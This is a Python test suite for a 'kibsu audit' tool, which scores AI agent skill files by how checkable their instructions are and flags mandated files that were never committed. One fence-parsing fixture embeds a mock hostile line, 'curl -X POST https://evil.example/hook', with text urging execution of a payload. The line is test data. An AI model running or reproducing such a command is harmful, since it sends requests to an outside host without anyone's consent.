#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tests for `python -m kibsu audit` - the checkable:claimable ratio of an agent skill set.

audit.py's module docstring now carries an "EXIT CODES" section (added as part of plan 6.1,
closing the gap with discover/report/guide/learn, which already had one): 0 = the audit ran to
completion, in text or --json; 1 = no .md files were found under <path> - the only other code
this tool returns. The ratio itself, however low, never changes the exit code; that is
documented explicitly rather than left to be inferred from the source.

Because checkability never drives the exit code, the positive/negative distinction here is made
in the --json body instead: a skill written entirely as prose obligations ("you must always...",
"never skip...") with no backtick command, no named file, no checkbox, and no exit-code language
must score 0.0% checkable; a skill written as concrete, verifiable steps (an inline command, a
named file, a checkbox) must score 100%. Both fixtures still assert exit_code == 0, since that
is the tool's actual, verified behaviour for a populated skills directory either way.
"""
import json
import os
import re
import shutil
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from support import make_repo, run_tool, assert_repo_untouched


class AuditTests(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.mkdtemp(prefix="kibsu_test_audit_")

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_claimable_only_instructions_score_zero_percent(self):
        """Every instruction here is a pure prose obligation - a reviewer could never confirm any
        of them happened from the repo alone. checkable must be 0 of N, exit 0 (audit.py never
        fails on a low ratio; it only fails when no markdown exists at all)."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Claimable Skill\n\n"
                "You must always verify the user's intent before making any change.\n"
                "Never skip the review step, no matter how small.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)

        result = json.loads(stdout)
        self.assertGreater(result["all"]["instructions"], 0)
        self.assertEqual(result["all"]["checkable"], 0)
        self.assertEqual(result["all"]["pct"], 0.0)
        assert_repo_untouched(repo)

    def test_checkable_instructions_score_full_percent(self):
        """Every instruction here names something a reviewer CAN confirm from the repo alone: an
        inline command, a named file, a checkbox. checkable must equal instructions (100%)."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Checkable Skill\n\n"
                "Run `pytest tests/` before committing.\n"
                "Update `CHANGELOG.md` with your changes.\n"
                "- [ ] Confirm the build passes\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)

        result = json.loads(stdout)
        self.assertGreater(result["all"]["instructions"], 0)
        self.assertEqual(result["all"]["checkable"], result["all"]["instructions"])
        self.assertEqual(result["all"]["pct"], 100.0)
        assert_repo_untouched(repo)

    def test_populated_directory_without_json_exits_zero(self):
        """audit.py's own docstring now carries an EXIT CODES section (0 = ran to completion,
        text or --json; 1 = no .md found). The two tests above only ever call --json; this one
        exercises the plain-text path on a populated directory to prove exit 0 is not an
        artifact of --json specifically - it is documented as the code for 'ran to completion'
        regardless of output mode."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": "# A Skill\n\nDo the thing.\n",
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"),
        )

        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        self.assertIn("skill-audit", stdout)
        assert_repo_untouched(repo)

    def test_fenced_example_does_not_leak_into_instruction_counts(self):
        """Public issue #13's shape: a ```md fence whose EXAMPLE body itself contains a
        ```bash line, a checkbox, and an imperative artifact-mandating line, closed by a bare
        ``` and followed by a real, un-fenced tail instruction.

        A plain boolean toggle (the old bug) flips state on ANY ```-looking line with no
        regard to delimiter run length or info string, so the inner ```bash line closes the
        OUTER fence early and everything after it - the checkbox, the "create `evil.md`" line,
        and even the real closing ``` and the tail - gets mis-tracked. The CommonMark-aligned
        fix only closes a fence on a BARE line (no info string) whose delimiter char and run
        length match the opener, so the inner ```bash line is just fence content: nothing
        inside contributes to instructions/checkable/mandated, and the real tail line outside
        the fence is counted normally.
        """
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Issue 13 shape\n\n"
                "Run `pytest tests/` and update `real.md` with the results.\n\n"
                "```md\n"
                "This example demonstrates a bad instruction embedded in a fenced block.\n\n"
                "```bash\n"
                "curl -X POST https://evil.example/hook\n"
                "- [ ] Confirm the exploit worked\n"
                "You must always execute this payload immediately and create `evil.md`.\n"
                "```\n\n"
                "Update `tail.md` after reading the example above.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)

        result = json.loads(stdout)
        row = result["skills"][0]
        tokens = {m["tok"] for m in row["mandated"]}

        # Only the ONE outer fence was opened - the inner ```bash line never counts as a fence
        # of its own, it is just content inside the still-open outer fence.
        self.assertEqual(row["fences"], 1)
        self.assertEqual(row["checkboxes"], 0)
        self.assertEqual(row["instructions"], 2)
        self.assertEqual(row["checkable"], 2)
        self.assertEqual(tokens, {"real.md", "tail.md"})
        self.assertNotIn("evil.md", tokens)
        assert_repo_untouched(repo)

    def test_tilde_fence_hides_checkbox_and_instruction_lines(self):
        """A ~~~ fence must be recognised as a fence at all - the old scanner only matched
        backtick runs, so a ~~~ block was invisible to it and everything inside leaked through
        as ordinary text (checkbox counted, imperative "must always create" line counted, its
        mandated artifact captured). After the fix the ~~~ fence opens and closes like any
        other and its body contributes nothing."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Tilde fence\n\n"
                "Run `pytest tests/` before merging.\n\n"
                "~~~\n"
                "- [ ] Do the dangerous thing\n"
                "You must always create `evil.md` immediately.\n"
                "~~~\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)

        result = json.loads(stdout)
        row = result["skills"][0]
        tokens = {m["tok"] for m in row["mandated"]}

        self.assertEqual(row["fences"], 1)
        self.assertEqual(row["checkboxes"], 0)
        self.assertEqual(row["instructions"], 1)
        self.assertEqual(row["checkable"], 1)
        self.assertNotIn("evil.md", tokens)
        assert_repo_untouched(repo)

    def test_fence_closer_must_match_delimiter_run_length(self):
        """CommonMark: a closing fence must use the SAME delimiter character and a run AT
        LEAST as long as the opener. A 4-backtick opener (````python) is therefore NOT closed
        by a bare 3-backtick line - that line is just content, so the "create `hidden.md`"
        line right after it must stay hidden too - but IS closed by a bare 4-backtick line,
        after which a real "create `visible.md`" line outside the fence counts normally."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "````python\n"
                "print('still open')\n"
                "```\n"
                "Create `hidden.md` now.\n"
                "````\n"
                "Create `visible.md` now.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)

        result = json.loads(stdout)
        row = result["skills"][0]
        tokens = {m["tok"] for m in row["mandated"]}

        self.assertEqual(row["fences"], 1)
        self.assertEqual(row["runnable_fences"], 1)
        self.assertEqual(tokens, {"visible.md"})
        self.assertNotIn("hidden.md", tokens)
        assert_repo_untouched(repo)

    def test_uppercase_extension_file_token_is_mandated(self):
        """Sibling of issue #14: FILE_TOKEN (audit.py's mandated-artifact extractor) was compiled
        without re.IGNORECASE, so an uppercase-extension mandate like `NOTES.MD` was invisible -
        never extracted into `mandated`, never counted checkable, never phantom-checked, even
        though the artifact-verb + backtick-file shape is identical to the lowercase case. A
        skill that mandates `NOTES.MD` must show up in `mandated` the same way one that mandates
        `notes.md` does."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Uppercase Mandate Skill\n\n"
                "Update `NOTES.MD` every time you finish a task.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)

        result = json.loads(stdout)
        mandated_tokens = {m["tok"] for m in result["skills"][0]["mandated"]}
        self.assertIn("NOTES.MD", mandated_tokens)
        assert_repo_untouched(repo)

    def test_uppercase_extension_line_scores_checkable(self):
        """Sibling of issue #14: PATHY (the bare, non-backtick file-name detector that feeds the
        `checkable` test) was also compiled without re.IGNORECASE, so a line naming an
        uppercase-extension file with no backticks - e.g. "Update NOTES.MD after every run." -
        never matched PATHY and was scored CLAIMABLE even though a reviewer can plainly confirm
        the named file from the repo alone."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Uppercase Path Skill\n\n"
                "Update NOTES.MD after every run.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)

        result = json.loads(stdout)
        self.assertEqual(result["all"]["instructions"], 1)
        self.assertEqual(result["all"]["checkable"], 1)
        assert_repo_untouched(repo)

    def test_lowercase_mandate_still_works(self):
        """Guard: the IGNORECASE fix must not change behaviour for the ordinary lowercase case
        that already worked - `notes.md` must still be extracted into `mandated` exactly as
        before."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Lowercase Mandate Skill\n\n"
                "Update `notes.md` every time you finish a task.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)

        result = json.loads(stdout)
        mandated_tokens = {m["tok"] for m in result["skills"][0]["mandated"]}
        self.assertIn("notes.md", mandated_tokens)
        assert_repo_untouched(repo)

    def test_no_markdown_found_exits_one(self):
        """Per audit.py's EXIT CODES section: a directory with no markdown files makes audit.py
        print "no .md found under ..." and return 1 - the only exit code besides 0 this tool has
        at all."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/.gitkeep": "",
        })
        empty_dir = os.path.join(repo, ".claude", "skills")

        exit_code, stdout, stderr = run_tool("audit", empty_dir)

        self.assertEqual(exit_code, 1, "stderr=%r" % stderr)
        self.assertIn("no .md found under", stdout)
        assert_repo_untouched(repo)


class ArtifactInstanceCountTests(unittest.TestCase):
    """v0.4.0's INSTANCE-COUNT phantom redesign (public issue #14 plus the two bugs hiding behind
    it - see audit.py's glob_re()/check_artifacts()).

    Before this: `{...}` placeholder segments survived re.escape() as LITERAL characters, so a
    mandate like `logs/report_{date}.md` could only ever match a file that literally contained a
    brace - it always read as phantom no matter how many real report_2026-07-30.md files a repo
    had. Fixed by expanding `{...}` to "any run of non-slash characters", identically to how `*`
    already expands - applied to the directory prefix too, so a brace in a directory segment no
    longer gets dropped for the wrong reason ("path prefix does not exist") before the phantom
    check ever sees it.

    Every fixture here uses a skill file under `.claude/skills/` (matching the existing tests'
    fixture shape) plus files committed at the REPO ROOT, because check_artifacts() walks the
    whole git repo (via git_root()), not just the audited subdirectory - a mandated artifact can
    live anywhere in the tree.
    """

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp(prefix="kibsu_test_audit_artifacts_")

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def _artifact(self, result, token):
        arts = [a for a in result["artifacts"] if a["artifact"] == token]
        self.assertEqual(
            len(arts), 1,
            "expected exactly one artifact record for %r, got %r" % (token, arts),
        )
        return arts[0]

    def test_issue_14_templated_mandate_with_committed_match_is_not_phantom(self):
        """The issue #14 repro: `logs/report_{date}.md` mandated, and a real
        logs/report_2026-07-30.md committed. Must NOT be phantom, must show match_count >= 1,
        and must be flagged templated=True so a reader knows this was a pattern check, not a
        literal one."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Reporting Skill\n\n"
                "Write `logs/report_{date}.md` after each nightly run.\n"
            ),
            "logs/report_2026-07-30.md": "nightly report\n",
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "logs/report_{date}.md")

        self.assertTrue(art["in_scope"], art)
        self.assertTrue(art["templated"], art)
        self.assertGreaterEqual(art["match_count"], 1, art)
        self.assertTrue(art["in_tree"], art)
        self.assertFalse(art["unverifiable_pattern"], art)
        self.assertFalse(art["phantom"], art)
        assert_repo_untouched(repo)

    def test_templated_mandate_with_zero_matches_is_still_phantom(self):
        """The anti-laundering case the council was explicit about: braces must not launder a
        mandate nobody ever served. Same mandate as above, same in-scope directory (`logs/`
        exists, via a real committed file), but nothing matching `report_{date}.md` was ever
        committed - this must still be reported phantom, with match_count == 0."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Reporting Skill\n\n"
                "Write `logs/report_{date}.md` after each nightly run.\n"
            ),
            "logs/README.md": "not a report\n",
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "logs/report_{date}.md")

        self.assertTrue(art["in_scope"], art)
        self.assertTrue(art["templated"], art)
        self.assertEqual(art["match_count"], 0, art)
        self.assertFalse(art["unverifiable_pattern"], art)
        self.assertTrue(art["phantom"], art)
        assert_repo_untouched(repo)

    def test_bare_placeholder_basename_is_unverifiable_not_phantom(self):
        """`{name}.md` retains no literal character beyond its extension - there is nothing left
        to search FOR, so it lands in the new unverifiable_pattern bucket: neither phantom
        (nothing was actually checked) nor served (nothing was actually found)."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Notes Skill\n\n"
                "Create `{name}.md` for each entry.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "{name}.md")

        self.assertTrue(art["in_scope"], art)
        self.assertTrue(art["templated"], art)
        self.assertTrue(art["unverifiable_pattern"], art)
        self.assertFalse(art["phantom"], art)
        assert_repo_untouched(repo)

    def test_brace_in_directory_segment_is_prefix_checked_with_pattern(self):
        """The wrong-reason-drop bug: a brace in a DIRECTORY segment used to make the path-prefix
        filter compare `{lang}` to real directory names literally, always lose, and get dropped
        as out-of-scope before the phantom check ever ran. `docs/{lang}/README.md` mandated,
        `docs/en/README.md` really committed - must be in-scope and not phantom."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Translation Skill\n\n"
                "Save `docs/{lang}/README.md` after translating.\n"
            ),
            "docs/en/README.md": "hello\n",
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "docs/{lang}/README.md")

        self.assertTrue(art["in_scope"], art)
        self.assertIsNone(art["out_of_scope_reason"], art)
        self.assertTrue(art["templated"], art)
        self.assertGreaterEqual(art["match_count"], 1, art)
        self.assertFalse(art["phantom"], art)
        assert_repo_untouched(repo)

    def test_literal_mandate_phantom_behaviour_unchanged(self):
        """Regression guard: a plain literal mandate that was never committed must behave exactly
        as it did before this redesign - phantom, not templated, not unverifiable."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/example-skill.md": (
                "# Changelog Skill\n\n"
                "Update `CHANGELOG.md` after every release.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "CHANGELOG.md")

        self.assertTrue(art["in_scope"], art)
        self.assertFalse(art["templated"], art)
        self.assertEqual(art["match_count"], 0, art)
        self.assertFalse(art["in_tree"], art)
        self.assertFalse(art["in_history"], art)
        self.assertFalse(art["unverifiable_pattern"], art)
        self.assertTrue(art["phantom"], art)
        assert_repo_untouched(repo)


class ScaffoldScopeLineLevelTests(unittest.TestCase):
    """The council ruling on the SCAFFOLD_SKILL false-positive class: the old sweep matched a
    scaffold keyword ANYWHERE in a skill's frontmatter or the first 1500 characters of its
    body, then excluded EVERY artifact that skill mandated - so a persona skill that merely
    mentioned "template" in an unrelated sentence lost phantom-checking on artifacts it never
    even scaffolds. Replaced by a LINE-LEVEL rule scoped to the artifact's own mandate line
    (`m["line"]`): excluded as scaffold-scope only when a scaffold keyword and user-scope
    language ("your project", "the new project", "the generated", ...) co-occur on THAT line,
    and the keyword itself is not negated within a few tokens before it ("do not scaffold",
    "never scaffold").
    """

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp(prefix="kibsu_test_audit_scaffold_")

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def _artifact(self, result, token):
        arts = [a for a in result["artifacts"] if a["artifact"] == token]
        self.assertEqual(
            len(arts), 1,
            "expected exactly one artifact record for %r, got %r" % (token, arts),
        )
        return arts[0]

    def test_false_positive_persona_body_mentioning_template_no_longer_sweeps_artifact(self):
        """Confirmed false positive #1: an Angular persona skill whose BODY merely says
        "Template-driven and reactive forms" - nowhere near the skill's actual mandated
        artifact line. Under the old unit-level sweep, that lone word "template" anywhere in
        the first 1500 characters blanket-excluded every artifact this skill mandates. The
        mandate line itself ("Update `CHANGELOG.md` ...") carries no scaffold keyword and no
        user-scope language, so under the new line-level rule it must be in scope and
        genuinely phantom-checked (CHANGELOG.md is never committed here)."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/angular-expert.md": (
                "# Angular Expert\n\n"
                "You are a senior Angular engineer with deep framework expertise. "
                "Template-driven and reactive forms are both supported; prefer reactive "
                "forms for complex validation scenarios.\n\n"
                "Update `CHANGELOG.md` after every release.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "CHANGELOG.md")

        self.assertTrue(art["in_scope"], art)
        self.assertIsNone(art["out_of_scope_reason"], art)
        self.assertIsNone(art.get("out_of_scope_class"), art)
        self.assertTrue(art["phantom"], art)  # never committed - now actually checked
        assert_repo_untouched(repo)

    def test_false_positive_negated_scaffold_keyword_is_kept_in(self):
        """Confirmed false positive #2, and the negation fixture: the mandate line itself says
        the skill does NOT scaffold any project - "do NOT" sits a couple of tokens before
        "scaffold", so the keyword is negated and must not exclude the artifact, even though
        the word "scaffold" is right there on the same line as the mandated file."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/inplace-editor.md": (
                "# In-place Editor\n\n"
                "Update `CONFIG.md` in place - do NOT scaffold any project.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "CONFIG.md")

        self.assertTrue(art["in_scope"], art)
        self.assertIsNone(art["out_of_scope_reason"], art)
        self.assertIsNone(art.get("out_of_scope_class"), art)
        assert_repo_untouched(repo)

    def test_genuine_generator_line_still_excluded_as_scaffold_scope(self):
        """The rule must still catch a REAL generator: a non-negated scaffold keyword
        co-occurring with user-scope language on the mandate's own line - "scaffold
        `src/App.tsx` in the new project" - must still be excluded, and specifically with
        reason class 'scaffold-scope', not folded into a different reason."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/react-scaffolder.md": (
                "# React Scaffolder\n\n"
                "This skill must scaffold `src/App.tsx` in the new project.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "src/App.tsx")

        self.assertFalse(art["in_scope"], art)
        self.assertEqual(art["out_of_scope_class"], "scaffold-scope", art)
        assert_repo_untouched(repo)

    def test_user_scope_vocabulary_into_the_users_without_a_listed_noun(self):
        """USER_SCOPE_LINE's vocabulary extension: "into the user's ..." must count as
        user-scope language even when the noun after it ("workspace") is not one of the
        specific nouns (project/repo/app/...) the rest of the pattern lists - the council
        named "into the user's" as its own vocabulary entry, not conditioned on a fixed noun
        list. Combined with a non-negated scaffold keyword on the same line, this must still
        exclude as scaffold-scope."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/bundler.md": (
                "# Bundler\n\n"
                "This skill must scaffold `dist/out.js` into the user's workspace.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "dist/out.js")

        self.assertFalse(art["in_scope"], art)
        self.assertEqual(art["out_of_scope_class"], "scaffold-scope", art)
        assert_repo_untouched(repo)


class DeclaredScopeOverrideTests(unittest.TestCase):
    """Council ruling #2: a unit's frontmatter can declare its scope explicitly (`scope:
    user-project` or `scope: repo`), and the declaration wins over the heuristic in BOTH
    directions - a declared user-project excludes even an artifact line with no scaffold or
    user-scope language at all, and a declared repo includes even an artifact line the
    heuristic would otherwise flag as scaffold-scope.
    """

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp(prefix="kibsu_test_audit_declared_scope_")

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def _artifact(self, result, token):
        arts = [a for a in result["artifacts"] if a["artifact"] == token]
        self.assertEqual(
            len(arts), 1,
            "expected exactly one artifact record for %r, got %r" % (token, arts),
        )
        return arts[0]

    def test_declared_user_project_excludes_even_without_any_keywords(self):
        """The mandate line here - "Write `output.txt` when finished." - carries no scaffold
        keyword and no user-scope language, and its path prefix trivially exists (no
        directory at all). Under the heuristic alone this artifact would be in scope. The
        frontmatter's explicit `scope: user-project` must override that and exclude it
        anyway, with reason class 'declared-scope'."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/generic-writer.md": (
                "---\n"
                "scope: user-project\n"
                "---\n"
                "# Generic Writer\n\n"
                "Write `output.txt` when finished.\n"
            ),
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "output.txt")

        self.assertFalse(art["in_scope"], art)
        self.assertEqual(art["out_of_scope_class"], "declared-scope", art)
        assert_repo_untouched(repo)

    def test_declared_repo_includes_despite_a_matching_scaffold_scope_line(self):
        """The opposite direction: this mandate line - "must scaffold `dist/bundle.js` in
        the new project" - is exactly the shape the scaffold-scope heuristic excludes (see
        ScaffoldScopeLineLevelTests). With `scope: repo` declared in frontmatter, the
        declaration must win: the heuristic never even runs, and the artifact stays in
        scope (still subject to the path-prefix check, which is satisfied here by a real
        `dist/` directory)."""
        repo = make_repo(self.tmpdir, {
            ".claude/skills/repo-bundler.md": (
                "---\n"
                "scope: repo\n"
                "---\n"
                "# Repo Bundler\n\n"
                "This skill must scaffold `dist/bundle.js` in the new project.\n"
            ),
            "dist/.gitkeep": "",
        })

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        art = self._artifact(result, "dist/bundle.js")

        self.assertTrue(art["in_scope"], art)
        self.assertIsNone(art["out_of_scope_reason"], art)
        self.assertIsNone(art.get("out_of_scope_class"), art)
        assert_repo_untouched(repo)


class DisclosureLedgerTests(unittest.TestCase):
    """Council ruling #3, the non-negotiable: every exclusion reason-class is reported with
    its TOTAL count - never just a handful of samples - in both text output and JSON, and the
    counterfactual phantom rate (with exclusions applied vs. with every exclusion simply
    counted) is printed too, so the denominator's own effect on the headline number is never
    silent.
    """

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp(prefix="kibsu_test_audit_ledger_")

    def tearDown(self):
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def _make_multi_exclusion_repo(self):
        # A single mandate token this long (>=90 chars) is silently dropped by analyse()'s
        # length cap before it ever becomes an "artifact" record at all - the one exclusion
        # class that never appears in `artifacts`, only in the ledger's own separate count.
        long_token = ("x" * 95) + ".md"
        lines = [
            "# Multi Exclusion Skill",
            "",
            # in-scope, literal, and REAL (committed) - not phantom.
            "Update `CHANGELOG.md` after every release.",
        ]
        # five distinct prefix-missing exclusions - directories that were never committed.
        for i in range(1, 6):
            lines.append("Write `missing%d/report.md` on completion." % i)
        # one scaffold-scope exclusion.
        lines.append("This skill must scaffold `src/App.tsx` in the new project.")
        # one unverifiable_pattern (in-scope, no literal basename left to search for).
        lines.append("Create `{name}.md` for each entry.")
        # one length-cap drop - never reaches the artifacts list at all.
        lines.append("Write `%s` after finishing." % long_token)
        return make_repo(self.tmpdir, {
            ".claude/skills/multi-exclusion.md": "\n".join(lines) + "\n",
            "CHANGELOG.md": "existing changelog\n",
        })

    def test_exclusion_ledger_totals_present_in_json_and_text_not_just_samples(self):
        """--limit 1 caps every SAMPLE list this tool prints to one entry each - the ledger
        totals must be unaffected by that limit, because they are full counts, not samples."""
        repo = self._make_multi_exclusion_repo()

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
            "--limit", "1",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        ledger = result["exclusion_ledger"]

        self.assertEqual(ledger["prefix-missing"], 5, ledger)
        self.assertEqual(ledger["scaffold-scope"], 1, ledger)
        self.assertEqual(ledger["unverifiable_pattern"], 1, ledger)
        self.assertEqual(ledger["length-cap"], 1, ledger)

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--artifacts", "--limit", "1",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        for cls, want in (("prefix-missing", 5), ("scaffold-scope", 1),
                          ("unverifiable_pattern", 1), ("length-cap", 1)):
            m = re.search(re.escape(cls) + r":\s*(\d+)", stdout)
            self.assertIsNotNone(m, "no ledger line for %r in:\n%s" % (cls, stdout))
            self.assertEqual(int(m.group(1)), want,
                             "%s: expected total %d, text said %s" % (cls, want, m.group(1)))
        assert_repo_untouched(repo)

    def test_counterfactual_prints_in_scope_and_all_exclusions_rates(self):
        """The scoped rate (in-scope, verifiable artifacts only - what the headline PHANTOM
        line already reports) must differ visibly from the counterfactual rate that counts
        every excluded artifact too, so a reader can see how much the scope filtering itself
        is doing to the number. Here the one in-scope verifiable artifact (CHANGELOG.md) is
        real (0% phantom), while most of the excluded artifacts were never committed anywhere
        - counting them raises the rate sharply."""
        repo = self._make_multi_exclusion_repo()

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--json", "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        result = json.loads(stdout)
        cf = result["phantom_counterfactual"]

        self.assertEqual(cf["in_scope_n"], 1, cf)
        self.assertEqual(cf["in_scope_pct"], 0.0, cf)
        self.assertEqual(cf["all_n"], 8, cf)
        self.assertGreater(cf["all_pct"], cf["in_scope_pct"], cf)

        exit_code, stdout, stderr = run_tool(
            "audit", os.path.join(repo, ".claude", "skills"), "--artifacts",
        )
        self.assertEqual(exit_code, 0, "stderr=%r" % stderr)
        m = re.search(
            r"([\d.]+)% in-scope-only \((\d+) artifacts\) / "
            r"([\d.]+)% if all exclusions are counted \((\d+) artifacts\)",
            stdout,
        )
        self.assertIsNotNone(m, "no counterfactual line found in:\n%s" % stdout)
        self.assertEqual(float(m.group(1)), cf["in_scope_pct"])
        self.assertEqual(int(m.group(2)), cf["in_scope_n"])
        self.assertEqual(float(m.group(3)), cf["all_pct"])
        self.assertEqual(int(m.group(4)), cf["all_n"])
        assert_repo_untouched(repo)


if __name__ == "__main__":
    unittest.main()
